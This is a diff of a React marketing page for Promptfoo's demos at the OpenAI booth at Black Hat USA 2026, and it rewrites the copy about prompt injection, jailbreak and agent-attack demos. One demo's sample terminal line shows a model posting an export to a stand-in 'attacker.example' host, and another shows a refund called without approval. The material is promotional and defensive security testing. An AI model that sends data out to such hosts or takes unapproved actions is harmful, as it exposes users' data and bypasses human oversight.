@@ -43,7 +43,7 @@ const DEMOS: Demo[] = [
       { text: 'model  POST /export?to=attacker.example', tone: 'fail' },
     ],
     title: 'Injection through untrusted content',
-    body: 'Not slideware: a real application, a real retrieval path, and a payload that arrives inside the content it was asked to read. You leave with the transcript.',
+    body: 'Watch an application retrieve a document that hides a malicious instruction. The transcript shows what the agent did next.',
   },
   {
     id: 'agents',
@@ -53,7 +53,7 @@ const DEMOS: Demo[] = [
       { text: '       refund(order_id) called without approval', tone: 'dim' },
     ],
     title: 'Agents talked into acting',
-    body: 'Tool abuse, memory poisoning, and excessive agency. The interesting failures start when the model stops answering and starts doing.',
+    body: 'See what happens when an agent has more access than it needs. We test tool misuse, memory poisoning, and actions taken without human approval.',
   },
   {
     id: 'regression',
@@ -64,7 +64,7 @@ const DEMOS: Demo[] = [
       { text: '  1 confirmed finding -> 1 blocking test', tone: 'dim' },
     ],
     title: 'From finding to regression test',
-    body: "We'll show how one confirmed finding turns into a test case in your repo that runs on the next commit, and the one after that.",
+    body: 'See how one confirmed finding becomes a test in your repo and runs again on the next commit.',
   },
 ];
 
@@ -109,20 +109,19 @@ interface LineupEntry {
 }
 
 /**
- * Two adjacent pieces of OpenAI's security work, shown by what each one takes as
- * input. Deliberately not a hierarchy: Daybreak is the wider initiative these sit
- * alongside, not a parent product of either.
+ * Describe each security product by what it tests. Daybreak includes Codex Security,
+ * but Promptfoo should not be presented as a Daybreak product.
  */
 const LINEUP: LineupEntry[] = [
   {
     input: 'your repository',
     title: 'Codex Security',
-    body: 'The appsec agent. It builds a threat model of your repository, hunts vulnerabilities along it, and reproduces each one in a sandbox before it reaches your queue. It then proposes a minimal patch for a human to review; it does not modify your repository itself.',
+    body: 'Codex Security builds a threat model for your repository, reproduces likely vulnerabilities in a sandbox, and proposes fixes for human review. It does not change your code.',
   },
   {
     input: 'your deployed agent',
     title: 'Promptfoo',
-    body: 'Us. Codex Security reads the code you wrote; we go after the agent you shipped. Prompt injection, jailbreaks, tool abuse, excessive agency. Different halves of the same problem.',
+    body: 'We test the agent you actually ship for prompt injection, jailbreaks, tool misuse, and excessive agency. Codex Security checks the code; Promptfoo checks the agent.',
   },
 ];
 
@@ -230,13 +229,13 @@ export default function BlackHat2026(): React.ReactElement {
   return (
     <Layout
       title="Promptfoo at Black Hat USA 2026"
-      description="Promptfoo is part of OpenAI. Find the team at OpenAI booth 2967 in the Black Hat USA 2026 Business Hall, which runs August 4-6 at Mandalay Bay: live prompt injection, jailbreak, and agent attacks."
+      description="Promptfoo is part of OpenAI. Find the team at OpenAI booth #2967 in the Black Hat USA 2026 Business Hall, August 4-6 at Mandalay Bay."
     >
       <Head>
         <meta property="og:title" content="Promptfoo at Black Hat USA 2026 | AI Security" />
         <meta
           property="og:description"
-          content="Promptfoo demos at OpenAI booth 2967. The Black Hat Business Hall runs August 4-6. Live prompt injection, jailbreak, and agent attacks against real applications, plus the automated red teaming behind them."
+          content="Find Promptfoo at OpenAI booth #2967 in the Black Hat Business Hall, August 4-6. See live AI agent attacks and the transcripts they leave behind."
         />
         <meta
           property="og:image"
@@ -252,7 +251,7 @@ export default function BlackHat2026(): React.ReactElement {
         <meta name="twitter:title" content="Promptfoo at Black Hat USA 2026 | AI Security" />
         <meta
           name="twitter:description"
-          content="Live AI attack demos and automated red teaming. Promptfoo demos at OpenAI booth 2967 in the Black Hat Business Hall, Mandalay Bay."
+          content="See Promptfoo test real AI agents at OpenAI booth #2967 in the Black Hat Business Hall, August 4-6 at Mandalay Bay."
         />
         <meta
           name="twitter:image"
@@ -279,17 +278,16 @@ export default function BlackHat2026(): React.ReactElement {
                 <span className={styles.eyebrowDot} aria-hidden="true" />
                 Black Hat USA 2026 // Business Hall
               </p>
-              <p className={styles.identity}>Promptfoo at the OpenAI booth</p>
+              <p className={styles.identity}>Promptfoo at OpenAI booth #2967</p>
               <h1 className={styles.heroTitle}>
                 Break the agent.
                 <br />
                 <span className={styles.titleAccent}>Keep the evidence.</span>
               </h1>
               <p className={styles.heroSubtitle}>
-                Promptfoo is part of OpenAI. Find the Promptfoo team at the OpenAI booth, running
-                live attacks against real LLM applications: prompt injection, jailbreaks, data
-                exfiltration, and agents talked into doing things they shouldn't. Every break comes
-                with the transcript that proves it.
+                Promptfoo is part of OpenAI. Visit OpenAI booth #2967 to see us test real AI
+                applications for prompt injection, jailbreaks, data leaks, and unsafe agent actions.
+                When an attack works, you get the transcript.
               </p>
               <div className={styles.heroButtons}>
                 <a
@@ -306,7 +304,7 @@ export default function BlackHat2026(): React.ReactElement {
               <ul className={styles.eventDetails}>
                 <li className={styles.detail}>
                   <CalendarIcon />
-                  <span>August 1-6, 2026</span>
+                  <span>Conference: August 1-6, 2026</span>
                 </li>
                 <li className={styles.detail}>
                   <PinIcon />
@@ -318,7 +316,7 @@ export default function BlackHat2026(): React.ReactElement {
                 </li>
                 <li className={styles.detail}>
                   <FloorPlanIcon />
-                  <span>Business Hall, Aug 4-6</span>
+                  <span>Business Hall and booth: Aug 4-6</span>
                 </li>
               </ul>
             </div>
@@ -340,9 +338,9 @@ export default function BlackHat2026(): React.ReactElement {
                 <p className={styles.findLabel}>01 / The booth</p>
                 <h3 className={styles.boothNumber}>{BOOTH}</h3>
                 <p className={styles.findBody}>
-                  Promptfoo demos at OpenAI booth 2967, in the Business Hall — Bayside A–D at
-                  Mandalay Bay. Bring an architecture diagram or a sanitized test case. We'll map
-                  the attack surface and show where we'd probe first.
+                  Find us at OpenAI booth #2967 in Bayside halls A-D at Mandalay Bay. Bring an
+                  architecture diagram or a sanitized test case, and we'll show you where we'd start
+                  testing.
                 </p>
               </div>
               <div className={styles.findCard}>
@@ -355,7 +353,7 @@ export default function BlackHat2026(): React.ReactElement {
                         {day}
                       </time>
                       <span>
-                        {opensAt}–{closesAt}
+                        {opensAt} to {closesAt}
                         {note ? `, ${note}` : ''}
                       </span>
                     </li>
@@ -367,10 +365,11 @@ export default function BlackHat2026(): React.ReactElement {
                 </p>
               </div>
               <div className={styles.findCard}>
-                <p className={styles.findLabel}>03 / Or skip the line</p>
-                <h3 className={styles.findTitle}>Somewhere with working acoustics</h3>
+                <p className={styles.findLabel}>03 / Request a meeting</p>
+                <h3 className={styles.findTitle}>Want to talk through your stack?</h3>
                 <p className={styles.findBody}>
-                  Thirty minutes on your stack and your threat model, off the show floor.
+                  Request time to discuss your application and threat model away from the show
+                  floor.
                 </p>
                 <Link to="/contact/" className={styles.findLink}>
                   Request a meeting
@@ -390,7 +389,7 @@ export default function BlackHat2026(): React.ReactElement {
               <p className={styles.sectionEyebrow}>// Demos</p>
               <h2 className={styles.sectionTitle}>What we're demoing</h2>
               <p className={styles.sectionSubtitle}>
-                Three things, all running live against systems that fight back.
+                See what an attack does, then inspect the evidence it leaves behind.
               </p>
             </div>
             <div className={styles.demoGrid}>
@@ -447,19 +446,19 @@ export default function BlackHat2026(): React.ReactElement {
         <section className={styles.lineupSection}>
           <div className={styles.container}>
             <div className={styles.sectionHeader}>
-              <p className={styles.sectionEyebrow}>// Also at the booth</p>
+              <p className={styles.sectionEyebrow}>// OpenAI security</p>
               <h2 className={styles.sectionTitle}>The rest of the lineup</h2>
               <p className={styles.sectionSubtitle}>
-                At the OpenAI booth you can also meet the teams behind Daybreak and Codex Security.
+                Daybreak is OpenAI's broader cyber-defense initiative. Codex Security checks your
+                code, while Promptfoo tests the agent you ship.
               </p>
             </div>
             <div className={styles.lineupFrame}>
               <p className={styles.lineupFrameLabel}>Daybreak</p>
               <p className={styles.lineupFrameBody}>
-                OpenAI's cyber defense initiative: frontier models pointed at defense rather than
-                offense, a partner network, and funded work on patching the open source everyone
-                quietly depends on. The two below are adjacent efforts under OpenAI's wider security
-                work, split by what each one takes as input.
+                Daybreak brings together OpenAI models, Codex Security, and security partners to
+                help defenders find, verify, and fix vulnerabilities. Promptfoo complements that
+                work by testing deployed AI agents.
               </p>
               <div className={styles.lineupPair}>
                 {LINEUP.map((entry) => (
@@ -502,12 +501,11 @@ export default function BlackHat2026(): React.ReactElement {
           <div className={styles.container}>
             <div className={styles.runCard}>
               <div className={styles.runHeader}>
-                <p className={styles.sectionEyebrow}>// Aug 1 → Aug 9</p>
+                <p className={styles.sectionEyebrow}>// Black Hat + DEF CON</p>
                 <h2 className={styles.runTitle}>The Vegas run</h2>
                 <p className={styles.runIntro}>
-                  One week, two conferences, one very tired team. DEF CON 34's theme this year is
-                  "Agency," which is either a coincidence or the best gift a company that tests AI
-                  agents has ever been handed.
+                  Find us at OpenAI booth #2967 at Black Hat, Aug 4-6, then at OpenAI booth #1412 at
+                  DEF CON, Aug 7-9.
                 </p>
               </div>
               <div className={styles.runLegs}>
@@ -542,8 +540,8 @@ export default function BlackHat2026(): React.ReactElement {
           <div className={styles.container}>
             <h2 className={styles.finalTitle}>Attending Black Hat?</h2>
             <p className={styles.finalCopy}>
-              Request a meeting and we'll have something specific to show you. Walk-ups are welcome,
-              but the good demos draw a line.
+              Stop by OpenAI booth #2967 during Business Hall hours, or request a meeting to talk
+              through your application.
             </p>
             <div className={styles.ctaButtons}>
               <Link to="/contact/" className={styles.primaryButton}>
